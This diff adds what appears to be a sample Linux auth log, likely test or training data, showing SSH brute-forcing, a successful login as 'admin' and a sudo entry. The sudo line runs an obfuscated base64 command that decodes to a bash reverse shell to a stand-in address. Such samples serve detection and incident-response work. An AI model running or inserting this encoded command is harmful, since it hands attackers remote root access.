@@ -1,0 +1,34 @@
+Nov  9 02:58:01 web01 CRON[2211]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Nov  9 02:58:01 web01 CRON[2211]: pam_unix(cron:session): session closed for user root
+Nov  9 03:00:14 web01 sshd[2301]: Accepted publickey for sysadmin from 192.168.1.10 port 51022 ssh2: ED25519 SHA256:Su4WsgeKmBGbCkmnb6SDo2pV61hNFvG4R/kXSSR7+f4
+Nov  9 03:00:14 web01 sshd[2301]: pam_unix(sshd:session): session opened for user sysadmin(uid=1000) by (uid=0)
+Nov  9 03:02:37 web01 sshd[2340]: Failed password for sysadmin from 192.168.1.25 port 49811 ssh2
+Nov  9 03:02:41 web01 sshd[2340]: Accepted password for sysadmin from 192.168.1.25 port 49811 ssh2
+Nov  9 03:05:02 web01 sshd[2388]: Invalid user oracle from 198.51.100.23 port 40122
+Nov  9 03:05:04 web01 sshd[2388]: Failed password for invalid user oracle from 198.51.100.23 port 40122 ssh2
+Nov  9 03:05:07 web01 sshd[2390]: Invalid user test from 198.51.100.23 port 40130
+Nov  9 03:05:09 web01 sshd[2390]: Failed password for invalid user test from 198.51.100.23 port 40130 ssh2
+Nov  9 03:05:11 web01 sshd[2391]: Invalid user postgres from 198.51.100.23 port 40144
+Nov  9 03:05:13 web01 sshd[2391]: Failed password for invalid user postgres from 198.51.100.23 port 40144 ssh2
+Nov  9 03:05:15 web01 sshd[2392]: Invalid user ubuntu from 198.51.100.23 port 40151
+Nov  9 03:05:16 web01 sshd[2392]: Failed password for invalid user ubuntu from 198.51.100.23 port 40151 ssh2
+Nov  9 03:05:18 web01 sshd[2393]: Invalid user git from 198.51.100.23 port 40166
+Nov  9 03:05:19 web01 sshd[2393]: Failed password for invalid user git from 198.51.100.23 port 40166 ssh2
+Nov  9 03:05:20 web01 sshd[2395]: Invalid user ftpuser from 198.51.100.23 port 40188
+Nov  9 03:05:22 web01 sshd[2395]: Failed password for invalid user ftpuser from 198.51.100.23 port 40188 ssh2
+Nov  9 03:05:22 web01 sshd[2395]: Connection closed by invalid user ftpuser 198.51.100.23 port 40188 [preauth]
+Nov  9 03:11:45 web01 sshd[2410]: Failed password for root from 203.0.113.5 port 52314 ssh2
+Nov  9 03:11:55 web01 sshd[2410]: message repeated 3 times: [ Failed password for root from 203.0.113.5 port 52314 ssh2]
+Nov  9 03:12:03 web01 sshd[2418]: Failed password for admin from 203.0.113.5 port 52330 ssh2
+Nov  9 03:12:06 web01 sshd[2418]: Failed password for admin from 203.0.113.5 port 52330 ssh2
+Nov  9 03:12:15 web01 sshd[2425]: Accepted password for admin from 203.0.113.5 port 52341 ssh2
+Nov  9 03:12:15 web01 sshd[2425]: pam_unix(sshd:session): session opened for user admin(uid=1001) by (uid=0)
+Nov  9 03:14:22 web01 sudo:    admin : TTY=pts/1 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash -c echo YmFzaCAtaSA+JiAvZGV2L3RjcC8yMDMuMC4xMTMuOTkvNDQ0NCAwPiYx | base64 -d | bash
+Nov  9 03:15:40 web01 sshd[2425]: Received disconnect from 203.0.113.5 port 52341:11: disconnected by user
+Nov  9 03:15:40 web01 sshd[2425]: pam_unix(sshd:session): session closed for user admin
+Nov  9 03:20:31 web01 sshd[2460]: Failed password for root from 192.0.2.77 port 60001 ssh2
+Nov  9 03:20:34 web01 sshd[2460]: Failed password for root from 192.0.2.77 port 60001 ssh2
+Nov  9 03:20:36 web01 sshd[2460]: Connection closed by authenticating user root 192.0.2.77 port 60001 [preauth]
+Nov  9 03:30:01 web01 CRON[2501]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Nov  9 03:30:01 web01 CRON[2501]: pam_unix(cron:session): session closed for user root
+Nov  9 03:45:12 web01 sshd[2550]: Accepted publickey for deploy from 192.168.1.40 port 53344 ssh2: RSA SHA256:Be1k1BsR8L0KhiC29vdq6D141wurjuhhIytikeC4xGk
